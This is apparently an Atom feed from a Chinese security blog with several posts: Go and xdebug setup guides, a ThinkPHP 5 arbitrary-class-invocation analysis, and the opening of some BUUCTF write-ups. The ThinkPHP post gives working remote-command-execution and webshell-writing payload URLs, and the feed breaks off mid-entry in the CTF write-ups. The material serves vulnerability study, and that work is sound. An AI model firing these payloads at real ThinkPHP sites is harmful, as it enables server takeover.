<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mengd@</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-03T03:26:29.495Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mengd@</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Golang-Windows环境配置踩坑(超详细)</title>
    <link href="http://example.com/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"/>
    <id>http://example.com/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/</id>
    <published>2021-03-03T02:46:24.000Z</published>
    <updated>2021-03-03T03:26:29.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-下载，安装Go"><a href="#0x01-下载，安装Go" class="headerlink" title="0x01:下载，安装Go"></a>0x01:下载，安装Go</h1><p>访问<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303104923090.png" class title="image-20210303104923090"><p>选择对应版本，一路默认(注意一下安装路径，或者你自己选)，安装即可。</p><h1 id="0X02：配置系统环境变量"><a href="#0X02：配置系统环境变量" class="headerlink" title="0X02：配置系统环境变量"></a>0X02：配置系统环境变量</h1><h4 id="1-配置系统环境变量"><a href="#1-配置系统环境变量" class="headerlink" title="1.配置系统环境变量"></a>1.配置系统环境变量</h4><p>找到我们刚刚安装go的位置，我默认安装在了”C:\Program Files\Go“下，那么”C:\Program Files\Go\bin“就是系统环境变量的值，将它添加到其中即可。</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/1.png" class width="1"><p>起一下cmd验证一下，配置成功。</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303105724535.png" class title="image-20210303105724535"><h1 id="0X03-建立工作目录，配置GOPATH"><a href="#0X03-建立工作目录，配置GOPATH" class="headerlink" title="0X03:建立工作目录，配置GOPATH"></a>0X03:建立工作目录，配置GOPATH</h1><h4 id="1-GOPATH工程结构"><a href="#1-GOPATH工程结构" class="headerlink" title="1.GOPATH工程结构"></a>1.GOPATH工程结构</h4><p>在 GOPATH 指定的工作目录下，代码总是会保存在 $GOPATH/src 目录下。在工程经过 go build、go install 或 go get 等指令后，会将产生的二进制可执行文件放在 $GOPATH/bin 目录下，生成的中间缓存文件会被保存在 $GOPATH/pkg 下。</p><p>这里的$GOPATH指的便是我们的工作路径。举个例子</p><p>现在，我需要在D盘建立一个文件夹用来存放我的go代码文件，我会现在D盘下新建一个名字叫“go”文件夹，那么这个时候$GOPATH=D:\go，我们在D:\go下面创建三个文件夹，src,bin,pkg。然后将我们的代码放到src文件中来管理我们的代码文件如</p><p>“src\hello\hello.go”</p><h4 id="2-配置GOPATH环境变量"><a href="#2-配置GOPATH环境变量" class="headerlink" title="2.配置GOPATH环境变量"></a>2.配置GOPATH环境变量</h4><p>前面我们已经说过$GOPATH的值便是你项目目录的地址，我们将其添加到环境变量即可</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/2.png" class width="2"><h1 id="0X04-配置VSCODE"><a href="#0X04-配置VSCODE" class="headerlink" title="0X04:配置VSCODE"></a>0X04:配置VSCODE</h1><p>首先在VSCODE中安装go依赖就不说了</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303111235640.png" class title="image-20210303111235640"><p>然后当我们开开心心的运行第一个程序的时候会提示我们安装各种go组件,我这里没图了，当你运行的时候会在右下角弹出来，点击InstallAll</p><p>但是因为各种原因，百分之99是安装失败的。网上各种垃圾复制文章也不能起到任何的作用，基本上都是通过自己下载备份手动安装，但是这里我们可以通过Go自带的全球模块代理，设置代理后安装插件就OK了。</p><p>win10打开powershell</p><p>依次键入(注意，你直接复制后到powershell直接右键时会报错的，因为”on”的双引号会被去掉，记得手动加上)</p><p>$env:GO111MODULE=“on”</p><p>$env:GOPROXY=“<a href="https://goproxy.io”/">https://goproxy.io”</a></p><p>go env -w GOPROXY=<a href="https://goproxy.io,direct/">https://goproxy.io,direct</a></p><p>go env -w GOPRIVATE=*.corp.example.com</p><p>当你运行到go env -w GOPROXY=<a href="https://goproxy.io,direct很可能会出现警告“warning/">https://goproxy.io,direct很可能会出现警告“warning</a>: go env -w GOPROXY=… does not override conflicting OS environm”，但是在我的环境上出现此警告并没有对vscode安装插件出现影响。</p><p>一切安装完毕后运行时又有可能出现报错</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/001.png" class width="001"><p>出现该报错打开launch.json，复制以下代码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 使用 IntelliSense 了解相关属性。 </span><br><span class="line">    &#x2F;&#x2F; 悬停以查看现有属性的描述。</span><br><span class="line">    &#x2F;&#x2F; 欲了解更多信息，请访问: https:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?linkid&#x3D;830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;go&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;mode&quot;: &quot;auto&quot;,</span><br><span class="line">            &quot;remotePath&quot;: &quot;&quot;,</span><br><span class="line">            &quot;port&quot;: 2345,</span><br><span class="line">            &quot;host&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;env&quot;: &#123;</span><br><span class="line">                    &quot;GO111MODULE&quot;: &quot;off&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;args&quot;: [],</span><br><span class="line">            &quot;showLog&quot;: false</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，全部问题解决完毕。运行，Hello，Go！</p><img src="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20210303112404893.png" class title="image-20210303112404893">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-下载，安装Go&quot;&gt;&lt;a href=&quot;#0x01-下载，安装Go&quot; class=&quot;headerlink&quot; title=&quot;0x01:下载，安装Go&quot;&gt;&lt;/a&gt;0x01:下载，安装Go&lt;/h1&gt;&lt;p&gt;访问&lt;a href=&quot;https://golang.goog</summary>
      
    
    
    
    
    <category term="-Golang" scheme="http://example.com/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhp5.1.x反序列化漏洞分析利用</title>
    <link href="http://example.com/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/</id>
    <published>2021-03-02T06:49:33.000Z</published>
    <updated>2021-03-03T03:26:07.027Z</updated>
    
    <content type="html"><![CDATA[<p>更新中……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;更新中……&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="-Thinkphp5 -源码审计 -漏洞复现 -反序列化" scheme="http://example.com/tags/Thinkphp5-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5过滤不严导致调用任意类漏洞+源码分析</title>
    <link href="http://example.com/2021/01/25/Thinkphp5%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E6%BC%8F%E6%B4%9E+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/01/25/Thinkphp5%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8F%E7%B1%BB%E6%BC%8F%E6%B4%9E+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2021-01-25T09:19:30.000Z</published>
    <updated>2021-03-02T06:46:59.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Thinkphp-V5-1"><a href="#0x01-Thinkphp-V5-1" class="headerlink" title="0x01.Thinkphp V5.1"></a>0x01.Thinkphp V5.1</h1><p>在复现漏洞前先要了解thinkphp的一些基本信息以及一切基本运行模式。</p><h4 id="1-入口文件"><a href="#1-入口文件" class="headerlink" title="1.入口文件"></a>1.入口文件</h4><p>应用程序的所有http请求都有某一个文件接受并由这个文件转发到不同的功能代码。</p><p>默认入口文件为根目录下的public/index.php</p><h4 id="2-路由"><a href="#2-路由" class="headerlink" title="2.路由"></a>2.路由</h4><p>thinkphp的访问规则类似文件路径的形式，形如</p><p><a href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC...]">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</a></p><p>比如说我发起请求</p><p><a href="http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@">http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@</a></p><p>serverName为127.0.0.1</p><p>入口文件为tp5/public目录下的index.php文件</p><p>那么我访问的就是在服务器127.0.0.1上的tp5框架中的index模块中的index控制器中的hello操作，hello操作需要参数name，参数name的值为Mengd@</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301103035269.png" alt="image-20210301103035269"></p><p>所以我们会得到输出：hello，Mengd@</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02.漏洞分析"></a>0x02.漏洞分析</h1><h4 id="1-理论验证"><a href="#1-理论验证" class="headerlink" title="1.理论验证"></a>1.理论验证</h4><p>我们发现thinkphp是通过url来判断当前用户是进行的那一步操作，那么thinkphp存在的一些内置类和方法我们可不可以直接通过url来进行使用呢？</p><p>我们访问一段url：<a href="http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@%E5%B9%B6%E8%BF%9B%E8%A1%8C%E8%B7%9F%E8%B8%AA%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%8Bthinkphp%E6%98%AF%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86url%E7%9A%84">http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@并进行跟踪，看一下thinkphp是如何处理url的</a></p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301112725311.png" alt="image-20210301112725311"></p><p>命中断点，实例化控制器跟进controller方法</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301112830344.png" alt="image-20210301112830344"></p><p>来到controller方法，跟进parseModuleAndClass方法</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301112915909.png" alt="image-20210301112915909"></p><p>我们发现，当检测到$name中存在”\“的时候便会直接将$name赋值给$class，而我们发现类名都是带有命名空间的，所以这里我们就可以通过控制$name间接控制调用的类，进而达到实例化任何类的目的。</p><p>该漏洞的原理明了，就是对参数控制不严谨，导致存在任意类调用。理论成立，我们来实际操作一下。</p><h4 id="2-Payload尝试"><a href="#2-Payload尝试" class="headerlink" title="2.Payload尝试"></a>2.Payload尝试</h4><p>进行尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;index.php&#x2F;index&#x2F;think\app&#x2F;index</span><br></pre></td></tr></table></figure><p>按照之前的实验，理想状况是进入parseMoudleAndClass方法，$name的值为think\app，因为存在”\“,所以$class=think\app，就会实例化think\app模块，并且调用index方法。</p><p>可是当我们实际操作的时候变成了,我们发现浏览器将“\”自动转为了”/“，那么就导致thinkphp解读为了index模块下的think控制器的app操作，给以一个内容为index的参数导致我们实例化目标类失败。</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/F$X4C7TS%60IW$D7MH%5DX%5D9LGN.png" alt="img"></p><p>进入parseMoudleAndClass也可以看到这里的$name内容为think，而不是我们所希望的think\app</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301152017558.png" alt="image-20210301152017558"></p><p>Why？</p><p>通过分析我们发现，以刚才那个url举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;index.php&#x2F;index&#x2F;think\app&#x2F;index</span><br></pre></td></tr></table></figure><p>url中的关键部分（模块/控制器/操作/参数…）部分“/index/think\app/index”被保存在了环境变量PATH_INFO当中</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301151700224.png" alt="image-20210301151700224"></p><p>当然这里的”\“已经被替换为了“/”。</p><p>翻阅配置文件，发现该参数可以被变量s代替进行传入。</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301151858124.png" alt="image-20210301151858124"></p><p>修改url访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;think&#x2F;app&#x2F;index</span><br></pre></td></tr></table></figure><p>成功实例化think\app模块，该处提示方法不存在是因为确实没有index()这个方法。并且由此可以看出控制器已经实例化成功。</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301152244756.png" alt="image-20210301152244756"></p><p>$name的值也正常，为think\app</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301152451397.png" alt="image-20210301152451397"></p><p>至此，漏洞原理验证成功，现在只需要找到thinkphp自带的模块方法进行调用就好了</p><p>来远程命令执行(验证环境WIN10&amp;KALI2019)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;dir</span><br></pre></td></tr></table></figure><p>shell写入(验证环境WIN10&amp;KALI2019)（由于网上找的都存在控制器不存在的原因，我自己找了个写shell的模块）</p><p>修改点在think\Container模块，我找到的invokefunction方法是在app模块中的，但在5.1版本invokefunction方法已经被放入Container模块了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index&#x2F;think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;..&#x2F;test.php&amp;vars[1][]&#x3D;&lt;?php system(&quot;ls&quot;);?&gt;（注，这里的命令执行要注意部分命令在linux和windows中的区别）</span><br></pre></td></tr></table></figure><h4 id="3-payload跟进分析"><a href="#3-payload跟进分析" class="headerlink" title="3.payload跟进分析"></a>3.payload跟进分析</h4><p>我在win10环境下选择payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;dir</span><br></pre></td></tr></table></figure><p>进行跟进分析。</p><p>首先断点来到parseModuleAndClass方法</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301155558316.png" alt="image-20210301155558316"></p><p>$name的值为”\think\request”</p><p>由于存在反斜杠，直接将其赋值给$class</p><p>进入controller方法，检测$class是否存在，存在直接返回$this-&gt;__get($class)</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301194752998.png" alt="image-20210301194752998"></p><p>进入invokeMothod方法，通过invokeArgs方法即进入input操作</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301200347232.png" alt="image-20210301200347232"></p><p>继续往下来到filterValue函数，通过call_user_func()函数执行命令，得到了我们想要的结果</p><p><img src="/Thinkphp5%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210301200727170.png" alt="image-20210301200727170"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-Thinkphp-V5-1&quot;&gt;&lt;a href=&quot;#0x01-Thinkphp-V5-1&quot; class=&quot;headerlink&quot; title=&quot;0x01.Thinkphp V5.1&quot;&gt;&lt;/a&gt;0x01.Thinkphp V5.1&lt;/h1&gt;&lt;p&gt;在复现漏洞前</summary>
      
    
    
    
    
    <category term="Thinkphp5" scheme="http://example.com/tags/Thinkphp5/"/>
    
    <category term="源码审计" scheme="http://example.com/tags/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>配置PhpStorm+xdebug调试环境</title>
    <link href="http://example.com/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/</id>
    <published>2021-01-24T10:07:54.000Z</published>
    <updated>2021-01-28T15:54:42.666Z</updated>
    
    <content type="html"><![CDATA[<p>最近打算对一些常见的php代码进行源码审计，当然良好的调试环境也是少不了的，在配置PhpStorm+xdebug的时候踩了些坑，遂记录。</p><img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbrNwT.png" class><h1 id="1-0：下载对应版本的XDEBUG"><a href="#1-0：下载对应版本的XDEBUG" class="headerlink" title="1.0：下载对应版本的XDEBUG"></a>1.0：下载对应版本的XDEBUG</h1><p>xdebug对php版本信息有着较高的要求，首先得通过当前php的版本信息下载对应的xdebug插件。</p><p>在本地环境查看当前phpinfo：</p><p>我们直接ctrl+a全选复制，打开<a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a></p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbr5pd.png" class title="sbr5pd.png">]</p><p>将所有内容粘贴到框内并且点击<strong>Analyse my phpinfo() output</strong></p><p>下载对应的xdebug，复制小标号3的zend_extension = C:\php\ext\php_xdebug-3.0.2-7.2-vc15-nts.dll（注，每个人不一样）</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbrb0f.png" class title="sbrb0f.png">]</p><h1 id="1-1：更改php-ini配置文件"><a href="#1-1：更改php-ini配置文件" class="headerlink" title="1.1：更改php.ini配置文件"></a>1.1：更改php.ini配置文件</h1><p>打开对应目录的php.ini，我这里是D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\php.ini，然后将刚刚复制的加上如下对应配置即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#刚刚复制的xdebug所在路径</span><br><span class="line">zend_extension &#x3D; D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\ext\php_xdebug-3.0.2-7.2-vc15-nts.dll</span><br><span class="line">xdebug.mode &#x3D; debug#xdebug模式</span><br><span class="line">xdebug.start_with_request &#x3D; yes </span><br><span class="line">xdebug.client_port &#x3D; 9100#xdebug对应监听端口，默认为9000，这里设置为9100防止冲突</span><br><span class="line">xdebug.remote_host&#x3D;127.0.0.1 </span><br><span class="line">xdebug.remote_handler&#x3D;dbgp </span><br><span class="line">xdebug.idekey&#x3D;Mengda#链接密码，这个等等在PhpStorm设置的时候要用到</span><br></pre></td></tr></table></figure><p>然后重启apache服务器，打开phpstorm</p><h1 id="1-2：对PhpStorm进行配置"><a href="#1-2：对PhpStorm进行配置" class="headerlink" title="1.2：对PhpStorm进行配置"></a>1.2：对PhpStorm进行配置</h1><p>看到对应的setting-&gt;php-&gt;Debug更改Debug port为刚刚配置文件种的端口，这里是9100</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbyuGQ.png" class title="sbyuGQ.png">]</p><p>看到对应的setting-&gt;php-&gt;Debug-&gt;DBGP Proxy更改对应的IDEKEY(配置文件中设置的Key)，HOST，Port</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbyUG4.png" class title="sbyUG4.png">]</p><p>看到对应的setting-&gt;php-&gt;Servers添加一个服务，如图所示</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbg7o6.png" class title="sbg7o6.png">]</p><p>到此就设置完毕了，有时候可能会遇到一些报错，是因为现在的xdebug是3.X版本的，网上很多教程是2.X版本的，配置ejike文件中很多的变量名都进行了更新，导致报错。所以只需要将配置文件中xdebug的参数使用3.X版本的即可。本文章中之前给的配置参数就是3.X标准的，无需修改。</p><h1 id="1-3：用法介绍"><a href="#1-3：用法介绍" class="headerlink" title="1.3：用法介绍"></a>1.3：用法介绍</h1><p>介绍一下调试按钮所对应的功能</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sLohOf.png" class title="sLohOf.png">]</p><ul><li>第一个按钮：step over 步越</li></ul><p><em>执行当前函数的下一步，如果有子函数，也不会进入，会一直执行到函数结束</em></p><ul><li>第二个按钮：step into 步入</li></ul><p><em>执行当前函数的下一步，如果有子函数，会从头到尾执行子函数，还原了程序执行的最详细的路线，从构造函数到结尾的每一步都会跳到。</em></p><ul><li>第三个按钮：force step into</li></ul><p><em>与step into 相同，执行当前函数的下一步，如果有子函数也会进入子函数，只不过不会从头到尾的还原函数执行的路线，会直接跳到子函数内第一步，构造函数等一些前置方法会忽略</em></p><ul><li>第四个按钮：step out 步出</li></ul><p><em>跳出当前执行的函数，跳到父函数的下一步。</em></p><ul><li>第五个按钮：run to cursor </li></ul><p><em>执行到下一个断点处</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打算对一些常见的php代码进行源码审计，当然良好的调试环境也是少不了的，在配置PhpStorm+xdebug的时候踩了些坑，遂记录。&lt;/p&gt;
&lt;img src=&quot;/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="XDEBUG" scheme="http://example.com/tags/XDEBUG/"/>
    
    <category term="动态调试" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题记录</title>
    <link href="http://example.com/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-12-18T10:29:33.000Z</published>
    <updated>2021-02-04T14:57:31.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="护网杯-2018-WEB-easy-tornado-1"><a href="#护网杯-2018-WEB-easy-tornado-1" class="headerlink" title="护网杯 2018-WEB-easy_tornado 1"></a>护网杯 2018-WEB-easy_tornado 1</h2><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySvoAe.png" class title="ySvoAe.png"><p>直接百度tornado 是一个基于python的web模板，那么肯定存在模板注入，flag.txt告诉我们flag所在文件</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySvLct.png" class title="ySvLct.png"><p>hints.txt告诉我们flag文件的filehash的格式</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxSAg.png" class title="ySxSAg.png"><p>可以看到想要访问到/fllllllllllllag</p><p>就要让filehash等于md5(cookie_secret+md5(filename))</p><p>那么就要找到cookie_secret，考虑到这个题是模板注入，那么肯定存在某些对象指向全局变量或者指向cookie这个变量</p><p>通过百度，存在一个这样的对象handler.settings，通过它我们能访问到一些全局变量</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxkj0.png" class title="ySxkj0.png"><p>我们找到了cookie_secret 然后按照hint加密即可得到payload</p><p>filename=/fllllllllllllag&amp;filehash=40243a38051c62d9ae18aef649477b51</p><h2 id="RoarCTF-2019-Easy-Calc1"><a href="#RoarCTF-2019-Easy-Calc1" class="headerlink" title="[RoarCTF 2019]Easy Calc1"></a>[RoarCTF 2019]Easy Calc1</h2><p>这道题考察了php的字符串解析特性，如何利用该特性绕过waf</p><p>首先打开题目链接，发现是一个计算器，输入算式获得结果。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxgUg.png" class 